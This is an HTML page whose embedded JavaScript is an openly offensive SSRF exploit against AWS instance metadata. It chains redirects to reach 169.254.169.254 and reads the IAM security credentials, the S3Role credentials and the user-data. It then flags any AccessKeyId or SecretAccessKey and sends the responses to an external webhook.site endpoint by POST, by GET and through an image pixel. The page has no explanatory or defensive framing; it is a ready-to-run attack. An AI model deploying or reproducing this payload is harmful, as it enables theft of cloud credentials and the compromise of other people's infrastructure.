<!DOCTYPE html>
<html>
<head>
    <title>Real-Time AWS Metadata Exfiltration</title>
</head>
<body>
    <h1>ðŸš€ Real-Time AWS Metadata Exfiltration</h1>
    <p>Check your webhook URL for real-time results!</p>
    
    <div id="status">Starting exfiltration...</div>
    
    <script>
        // Replace this with your actual webhook URL
        var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
        
        // Alternative: Use requestbin.com, pipedream.com, or similar
        
        function sendData(testName, url, response, method = 'POST') {
            var data = {
                timestamp: new Date().toISOString(),
                test: testName,
                target_url: url,
                response_length: response.length,
                response_data: response,
                has_credentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey'),
                source: 'AWS_METADATA_SSRF'
            };
            
            try {
                // Method 1: POST request
                if (method === 'POST') {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', WEBHOOK_URL, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(data));
                }
                
                // Method 2: GET request with data in URL (backup)
                if (method === 'GET') {
                    var params = new URLSearchParams();
                    params.append('test', testName);
                    params.append('length', response.length);
                    params.append('data', response.substring(0, 1000)); // Truncate for URL limits
                    params.append('credentials', data.has_credentials);
                    
                    var getXhr = new XMLHttpRequest();
                    getXhr.open('GET', WEBHOOK_URL + '?' + params.toString(), true);
                    getXhr.send();
                }
                
                // Method 3: Image pixel tracking (always works)
                var img = new Image();
                img.src = WEBHOOK_URL + '/pixel?' + 
                    'test=' + encodeURIComponent(testName) + 
                    '&length=' + response.length +
                    '&hasCredentials=' + data.has_credentials +
                    '&timestamp=' + Date.now();
                
                document.getElementById('status').innerHTML += '<br>âœ… Sent: ' + testName;
                
            } catch (e) {
                document.getElementById('status').innerHTML += '<br>âŒ Failed to send: ' + testName + ' - ' + e.message;
            }
        }
        
        function executeAndExfiltrate(url, testName) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', url, false);
                xhr.send();
                
                var response = xhr.responseText;
                
                // Send via multiple methods for reliability
                sendData(testName, url, response, 'POST');
                setTimeout(() => sendData(testName, url, response, 'GET'), 1000);
                
                document.getElementById('status').innerHTML += '<br>ðŸ“¡ ' + testName + ': ' + response.length + ' bytes';
                
                if (response.includes('AccessKeyId')) {
                    document.getElementById('status').innerHTML += '<br>ðŸš¨ CREDENTIALS DETECTED in ' + testName + '!';
                    
                    // Send urgent notification
                    sendData('URGENT_CREDENTIALS_FOUND', url, response, 'POST');
                }
                
            } catch (e) {
                sendData(testName + '_ERROR', url, 'ERROR: ' + e.message, 'POST');
                document.getElementById('status').innerHTML += '<br>âŒ ' + testName + ': ' + e.message;
            }
        }
        
        // Execute tests with exfiltration
        document.getElementById('status').innerHTML = 'Starting AWS metadata extraction...';
        
        setTimeout(() => {
            executeAndExfiltrate(
                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
                'AWS_Metadata_v1.0_Root'
            );
        }, 2000);
        
        setTimeout(() => {
            executeAndExfiltrate(
                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
                'IAM_Security_Credentials_List'
            );
        }, 5000);
        
        setTimeout(() => {
            executeAndExfiltrate(
                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
                'S3Role_Credentials'
            );
        }, 8000);
        
        setTimeout(() => {
            executeAndExfiltrate(
                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
                'User_Data'
            );
        }, 11000);
        
        setTimeout(() => {
            executeAndExfiltrate(
                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
                'Legacy_S3Role_2007'
            );
        }, 14000);
        
        setTimeout(() => {
            sendData('EXFILTRATION_COMPLETE', 'N/A', 'All tests completed at ' + new Date().toISOString(), 'POST');
            document.getElementById('status').innerHTML += '<br><br>ðŸŽ‰ Exfiltration complete! Check your webhook for results.';
        }, 17000);
    </script>
</body>
</html>
